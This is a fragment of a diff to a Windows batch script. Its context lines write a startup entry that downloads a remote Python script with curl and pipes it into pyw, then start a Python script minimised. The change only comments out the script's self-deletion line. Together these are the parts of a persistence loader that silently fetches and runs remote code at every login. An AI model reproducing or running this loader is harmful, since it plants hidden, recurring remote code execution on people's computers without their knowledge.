@@ -52,6 +52,6 @@ echo curl -s "%PYTHON_SCRIPT_URL%" ^| pyw - >> "%STARTUP_BATCH_PATH%"
 start /min pyw "%PYTHON_SCRIPT_PATH%"
 
 :: Clean up
-del "%~f0"
+::del "%~f0"
 
 exit
